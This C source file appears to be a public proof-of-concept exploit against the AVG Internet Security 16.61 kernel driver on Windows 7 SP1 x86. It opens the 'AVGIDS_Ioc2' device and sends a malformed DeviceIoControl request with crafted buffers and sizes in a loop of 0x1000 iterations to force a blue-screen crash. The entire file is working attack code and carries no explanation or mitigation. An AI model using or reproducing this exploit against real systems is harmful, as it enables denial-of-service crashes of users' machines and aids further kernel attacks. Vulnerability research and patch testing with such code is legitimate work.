/**
* Author: bee13oy
* BSoD on Windows 7 SP1 x86 + AVG Internet Security 16.61.7539
**/

#include "stdafx.h"
#include <Windows.h>

HANDLE OpenDevice(const char* szDeviceName) {
	CHAR szOpenDeviceName[0x200] = "";
	sprintf(szOpenDeviceName, "\\\\.\\%s", szDeviceName);
	HANDLE hDevice = CreateFileA(szOpenDeviceName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);

	if(hDevice == INVALID_HANDLE_VALUE) {
		hDevice = CreateFileA(szOpenDeviceName, 
			GENERIC_READ, 
			0, 
			NULL, 
			OPEN_EXISTING, 
			0, 
			NULL
			);
	}
	return hDevice;
}

void BSoD(const char* szDeviceName)
{
	HANDLE hFile = OpenDevice(szDeviceName);
	if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
	{
		DWORD nbBytes = 0;
		CHAR bufInput[0x1000+1] = "\xe4\xc5\x00\x00\x00\x00\x00\x00\x88\x88\xff\xff";
		CHAR bufOutput[0x1000+1] = "\x00"; 
		DeviceIoControl(
			hFile, 
			0x53606148,
			bufInput, 
			0x000009a1,
			bufOutput, 
			0x00000526,
			&nbBytes, 
			NULL
			);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD dwCount = 0;
	do 
	{
		BSoD("AVGIDS_Ioc2");
	} while (dwCount++ < 0x1000);

	return 0;
}
